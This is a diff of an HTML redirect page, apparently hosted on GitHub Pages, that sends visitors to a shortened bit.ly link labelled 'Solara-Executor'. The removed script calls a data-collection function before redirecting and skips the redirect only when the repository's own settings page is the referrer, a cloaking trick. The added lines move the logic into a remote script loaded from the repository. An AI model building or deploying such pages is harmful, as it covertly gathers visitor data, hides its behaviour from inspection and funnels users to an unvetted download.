@@ -1,35 +1,11 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8"/>
+    <meta content="width=device-width,initial-scale=1.0" name="viewport"/>
     <title>Redirecting...</title>
-    <!-- Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-NTTP5YDYL7"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-
-      gtag('config', 'G-NTTP5YDYL7');
-    </script>
-    <script>
-
-        function shouldRedirect() {
-            const referrer = getReferrer();
-            const blockReferrer = 'https://github.com/RebornPhantom/Repository/settings/pages';
-            return referrer !== blockReferrer;
-        }
-
-        if (shouldRedirect()) {
-            collectAndSendData();
-            setTimeout(() => {
-                window.location.href = 'https://bit.ly/Solara-Executor';
-            }, 100);
-        } else {
-            console.log('Redirect blocked due to referrer.');
-        }
-    </script>
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-NTTP5YDYL7"></script>
+    <script src="https://raw.githubusercontent.com/RebornPhantom/Repository/main/redirect.js"></script>
 </head>
 <body>
     <p>If you are not redirected, <a href="https://bit.ly/Solara-Executor">click here</a>.</p>
